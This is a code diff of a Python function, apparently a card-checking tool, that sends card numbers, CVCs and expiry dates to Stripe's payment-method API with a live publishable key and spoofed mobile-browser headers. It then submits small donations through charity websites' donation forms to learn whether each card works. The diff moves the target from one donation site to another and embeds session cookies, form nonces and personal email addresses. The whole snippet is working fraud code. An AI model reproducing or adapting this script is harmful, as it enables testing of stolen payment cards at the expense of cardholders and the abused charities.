@@ -27,72 +27,66 @@ def Tele(ccx):
 
 ##REQ1 
         headers = {
-    			'authority': 'api.stripe.com',
-    			'accept': 'application/json',
-    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    			'cache-control': 'no-cache',
-    			'content-type': 'application/x-www-form-urlencoded',
-    			'origin': 'https://js.stripe.com',
-    			'pragma': 'no-cache',
-    			'referer': 'https://js.stripe.com/',
-    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    			'sec-ch-ua-mobile': '?1',
-    			'sec-ch-ua-platform': '"Android"',
-    			'sec-fetch-dest': 'empty',
-    			'sec-fetch-mode': 'cors',
-    			'sec-fetch-site': 'same-site',
-    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    	}
-    
-        data = f'type=card&billing_details[name]=Tiana&billing_details[email]=roogerauft%40gmail.com&billing_details[address][line1]=1020+West+Blvd&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=897e2c48-e03a-4fa0-a086-40e2fa945a484bf8f1&muid=5a769ee3-f69d-47de-a978-042256575ba27873fd&sid=80859c18-39a4-4601-9571-ff97e8ace802b53011&payment_user_agent=stripe.js%2F4b35ef0d67%3B+stripe-js-v3%2F4b35ef0d67%3B+split-card-element&referrer=https%3A%2F%2Farf.org.uk&time_on_page=26340&key=pk_live_s68z8JPiZ1q027N9bSbyUjgn'
-        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    
-        pm = r1.json()['id']
-    
-    ##REQ2
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        }
+        
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f&sid=2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6&pasted_fields=number&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=122365&key=pk_live_51NpwDuJJGU2OiPGJ2vcO9MXONIWXVQJHRPyUKQMAYHFirXW8JvIEhN12Y6fRhdN7P7Ta5VDHtNvQgDfxtQsmmEyJ00BBJ1SMsl'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        try:
+        	id = response.json()['id']
+        except:
+        	pass
+        
+        
         cookies = {
-    			'__stripe_mid': '5a769ee3-f69d-47de-a978-042256575ba27873fd',
-    			'wssplashuid': 'f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1',
-    			'__stripe_sid': '80859c18-39a4-4601-9571-ff97e8ace802b53011',
-    	}
-    
+            '_ga': 'GA1.1.440936206.1732811776',
+            'unique_session_id': 'd566578f-e254-46f8-a64e-8cc0a43090be',
+            '__stripe_mid': '3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f',
+            '__stripe_sid': '2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6',
+            '_ga_6CGSWZ92TV': 'GS1.1.1732811775.1.1.1732811898.0.0.0',
+        }
+        
         headers = {
-    			'authority': 'arf.org.uk',
-    			'accept': '*/*',
-    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    			'cache-control': 'no-cache',
-    			'content-type': 'application/json',
-    			# 'cookie': '__stripe_mid=5a769ee3-f69d-47de-a978-042256575ba27873fd; wssplashuid=f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1; __stripe_sid=80859c18-39a4-4601-9571-ff97e8ace802b53011',
-    			'origin': 'https://arf.org.uk',
-    			'pragma': 'no-cache',
-    			'referer': 'https://arf.org.uk/donate/?__im-sFzkJhJR=1208077302829261439',
-    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    			'sec-ch-ua-mobile': '?1',
-    			'sec-ch-ua-platform': '"Android"',
-    			'sec-fetch-dest': 'empty',
-    			'sec-fetch-mode': 'cors',
-    			'sec-fetch-site': 'same-origin',
-    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    	}
-    
-        json_data = {
-    			'payment_method_id': ''+str(pm)+'',
-    			'email': 'roogerauft@gmail.com',
-    			'firstname': 'Tiana',
-    			'amount': '1.00',
-    			'project_key': 'Food Packs\n',
-    			'package_description': 'Food Packs\n - Select Type',
-    			'last4': '4129',
-    			'exp_month': 11,
-    			'exp_year': 2026,
-    			}
-    	
-        r2 = requests.post(
-    			'https://arf.org.uk/crm/stripe_files/create_payment.php',
-    			cookies=cookies,
-    			headers=headers,
-    			json=json_data,
-    	)
+            'authority': 'voxel.guide',
+            'accept': '*/*',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '_ga=GA1.1.440936206.1732811776; unique_session_id=d566578f-e254-46f8-a64e-8cc0a43090be; __stripe_mid=3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f; __stripe_sid=2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6; _ga_6CGSWZ92TV=GS1.1.1732811775.1.1.1732811898.0.0.0',
+            'origin': 'https://voxel.guide',
+            'referer': 'https://voxel.guide/donate/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        params = {
+            't': '1732811900521',
+        }
+        
+        data = {
+            'data': f'__fluent_form_embded_post_id=1499&_fluentform_3_fluentformnonce=34e4aedcb3&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&payment_input=Other&custom-payment-amount=5&description=&payment_method=stripe&gdpr-agreement=on&alt_s=&jidwsv1379=629289&item__3__fluent_checkme_=&__stripe_payment_method_id={id}',
+            'action': 'fluentform_submit',
+            'form_id': '3',
+        }
+        r2 = requests.post('https://voxel.guide/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
         return (ccx, r2.json(),ip)
     except:
         return "error", "error",ip
